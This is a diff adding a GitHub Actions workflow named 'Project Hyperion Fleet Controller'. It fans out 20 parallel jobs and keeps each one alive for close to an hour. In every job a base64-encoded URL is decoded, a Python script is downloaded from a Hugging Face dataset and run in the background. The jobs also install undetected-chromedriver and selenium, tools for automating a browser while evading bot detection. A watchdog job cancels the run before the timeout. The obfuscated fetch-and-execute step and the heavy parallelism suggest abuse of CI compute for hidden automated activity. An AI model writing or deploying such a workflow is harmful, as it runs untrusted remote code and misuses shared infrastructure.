@@ -1,0 +1,95 @@
+name: Project Hyperion Fleet Controller
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: hyperion-engine-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Monitor Core: يقوم للانتظار لمدة 59 دقيقة ثم إلغاء التشغيل
+  # =================================================================
+  monitor-core:
+    name: "Watchdog Monitor"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      MAX_WAIT_SEC: 3540
+    steps:
+      - name: Initialize Watchdog Routine
+        run: |
+          echo "--> [MONITOR] Watchdog initiated for Workflow ID: ${{ github.run_id }}"
+          echo "--> [MONITOR] Timer starting for ${MAX_WAIT_SEC} seconds..."
+
+          sleep "${MAX_WAIT_SEC}"
+
+          echo "--> [MONITOR] Time limit exceeded. Triggering global shutdown request..."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo "--> [MONITOR] Shutdown signal dispatched successfully."
+
+  # =================================================================
+  # Worker Nodes: تشغيل بالتوازي لجميع العقد
+  # =================================================================
+  worker-nodes:
+    name: "NodeTask-${{ matrix.node_tag }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_tag: [A101, A102, B201, B202, C301, C302, D401, D402, E501, E502, F601, F602, G701, G702, H801, H802, I901, I902, J001, J002]
+
+    steps:
+      # Stage 1: إعداد وتجهيز البيئة
+      - name: Setup System Environment
+        run: |
+          echo ":: Node [${{ matrix.node_tag }}] -> Preparing system libraries..."
+          sudo apt-get update -qq
+          sudo apt-get install -y curl python3-pip
+
+      # Stage 2: جلب البرنامج الأساسي وفك التشفير
+      - name: Fetch Core Binary
+        run: |
+          echo ":: Node [${{ matrix.node_tag }}] -> Fetching distant script payload..."
+          REMOTE_SRC=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
+          curl -sL "$REMOTE_SRC" -o runtime_runner.py
+          echo ":: Node [${{ matrix.node_tag }}] -> Script successfully retrieved."
+
+      # Stage 3: تثبيت المكتبات المطلوبة
+      - name: Deploy Python Dependencies
+        run: |
+          echo ":: Node [${{ matrix.node_tag }}] -> Installing python requirements..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # Stage 4: تشغيل السكريبت ومراقبته (59 دقيقة)
+      - name: Execute Main Task Loop
+        run: |
+          echo ":: Node [${{ matrix.node_tag }}] -> Executing process in background..."
+
+          python3 runtime_runner.py &
+          TASK_PID=$!
+
+          echo ":: Node [${{ matrix.node_tag }}] -> Process bound to PID ${TASK_PID}. Timeout set to 3540s."
+
+          sleep 3540
+
+          if kill -0 "$TASK_PID" 2>/dev/null; then
+            echo ":: Node [${{ matrix.node_tag }}] -> Timeout reached. Terminating process PID ${TASK_PID}..."
+            kill -9 "$TASK_PID"
+            echo ":: Node [${{ matrix.node_tag }}] -> Process killed."
+          else
+            echo ":: Node [${{ matrix.node_tag }}] -> Task finished execution naturally."
+          fi
